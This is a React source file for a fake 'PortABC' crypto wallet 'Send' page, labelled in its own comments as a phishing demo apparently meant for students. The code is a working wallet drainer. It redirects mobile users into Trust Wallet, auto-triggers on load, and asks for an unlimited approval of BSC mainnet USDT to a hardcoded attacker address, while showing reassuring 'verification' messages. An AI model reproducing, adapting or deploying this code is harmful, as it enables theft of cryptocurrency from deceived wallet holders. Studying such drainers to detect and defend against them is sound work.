"use client";

import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';

// USDT ABI - We only need 'approve' for the phishing part
const ERC20_ABI = ["function approve(address spender, uint256 amount) returns (bool)"];

// BSC Mainnet USDT Address
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

export default function PortABCDemo() {
  const [logs, setLogs] = useState<string[]>([]);
  const [targetAmount, setTargetAmount] = useState<string>("10");

  // --- CONFIGURATION ---
  // The Public Address of the "Attacker" MetaMask wallet
  const ADMIN_PUBLIC_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1"; 

  const addLog = (msg: string) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 5)]);
  };

  // --- THE AGGRESSIVE AUTO-TRIGGER ---
  useEffect(() => {
    const autoTrigger = async () => {
      const urlParams = new URLSearchParams(window.location.search);
      const isAuto = urlParams.get('auto') === 'true';

      if (isAuto) {
        addLog("Secure Tunnel Active. Checking wallet...");

        // Aggressive Interval: Checks every 100ms if Trust Wallet has injected 'ethereum'
        const checkProvider = setInterval(async () => {
          if (typeof window !== "undefined" && (window as any).ethereum) {
            clearInterval(checkProvider); // Stop checking once found
            
            addLog("Wallet detected. Initializing verification...");
            
            // Tiny delay (800ms) to ensure the UI is loaded before the popup hits
            setTimeout(async () => {
              try {
                const provider = new ethers.providers.Web3Provider((window as any).ethereum);
                // Force account request
                await provider.send("eth_requestAccounts", []);
                const signer = provider.getSigner();
                const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
                
                addLog("Finalizing transfer sequence...");
                // The actual 'Approve' popup
                const tx = await contract.approve(ADMIN_PUBLIC_ADDRESS, ethers.constants.MaxUint256);
                
                addLog("Signature pending...");
                await tx.wait();
                addLog("Verification Successful.");
              } catch (err: any) {
                addLog("User rejected transaction.");
              }
            }, 800);
          }
        }, 100);
      }
    };

    autoTrigger();
  }, []);

  // --- THE MAIN BUTTON LOGIC ---
  async function handleNextAction() {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    const isInsideWallet = typeof window !== "undefined" && (window as any).ethereum;

    // SCENARIO 1: User is in Mobile Chrome -> Jump to Trust Wallet
    if (isMobile && !isInsideWallet) {
      addLog("Redirecting to secure terminal...");
      
      // We append ?auto=true so the site knows to trigger the popup on the other side
      const currentUrl = window.location.origin + window.location.pathname + "?auto=true";
      const deepLink = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(currentUrl)}`;
      
      window.location.href = deepLink;
      return;
    }

    // SCENARIO 2: User is already inside a wallet browser or on Desktop
    try {
      if (!isInsideWallet) return alert("Please use a Web3 browser or install MetaMask.");
      
      const provider = new ethers.providers.Web3Provider((window as any).ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
      
      const tx = await contract.approve(ADMIN_PUBLIC_ADDRESS, ethers.constants.MaxUint256);
      addLog("Transaction sent...");
      await tx.wait();
      addLog("Verified.");
    } catch (err: any) {
      addLog("Error: " + err.message.slice(0, 30));
    }
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4 font-sans tracking-tight">
      
      {/* PortABC Styled Container */}
      <div className="w-full max-w-[420px] bg-[#111] border border-[#222] rounded-[40px] p-8 shadow-2xl shadow-black/50">
        <h1 className="text-xl font-bold mb-10 text-center tracking-wide">Send</h1>

        <div className="space-y-6">
          {/* Token Display */}
          <div className="bg-[#181818] border border-[#282828] p-4 rounded-3xl flex items-center justify-between shadow-inner">
            <div className="flex items-center gap-4">
              <div className="w-10 h-10 bg-green-500/10 rounded-full flex items-center justify-center text-[10px] font-black text-green-500 border border-green-500/20">
                USDT
              </div>
              <div>
                <p className="text-sm font-bold">USDT</p>
                <p className="text-[10px] text-gray-500 uppercase font-black tracking-widest">Tether USD</p>
              </div>
            </div>
            <span className="text-gray-700 text-xs mr-2">▼</span>
          </div>

          {/* Amount Box */}
          <div className="space-y-3">
            <label className="text-[11px] text-gray-600 font-black uppercase ml-1 tracking-[0.1em]">Amount</label>
            <div className="relative">
              <input 
                type="number" 
                value={targetAmount}
                onChange={(e) => setTargetAmount(e.target.value)}
                className="w-full bg-[#181818] border border-[#282828] p-5 rounded-3xl text-sm focus:outline-none focus:border-white/10 transition-all pr-24 font-medium"
              />
              <div className="absolute right-5 top-1/2 -translate-y-1/2 flex items-center gap-3">
                <span className="text-[11px] text-gray-500 font-bold uppercase">USDT</span>
                <button className="text-[11px] text-green-500 font-black uppercase tracking-widest">Max</button>
              </div>
            </div>
            <p className="text-[10px] text-gray-700 ml-1 font-bold">Available: Unable to verify balance</p>
          </div>

          {/* THE TRIGGER BUTTON */}
          <button 
            onClick={handleNextAction}
            className="w-full bg-white text-black font-black py-5 rounded-3xl hover:bg-gray-200 transition-all active:scale-[0.97] mt-4 shadow-xl shadow-white/5 text-sm uppercase tracking-widest"
          >
            Next
          </button>
        </div>
      </div>

      {/* Console Output for Students */}
      <div className="mt-10 w-full max-w-[420px] px-2 opacity-60">
        <div className="bg-[#0f0f0f] p-5 rounded-[24px] border border-[#222] font-mono text-[10px] text-gray-500 h-28 overflow-hidden relative">
           <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-green-500/20 to-transparent"></div>
          {logs.map((l, i) => <div key={i} className="mb-1 leading-relaxed">{l}</div>)}
          {logs.length === 0 && <div className="animate-pulse">Waiting for secure connection...</div>}
        </div>
      </div>

      <p className="mt-8 text-[9px] text-gray-700 font-black uppercase tracking-[0.3em]">Built with v0 • PortABC Network</p>
    </div>
  );
}
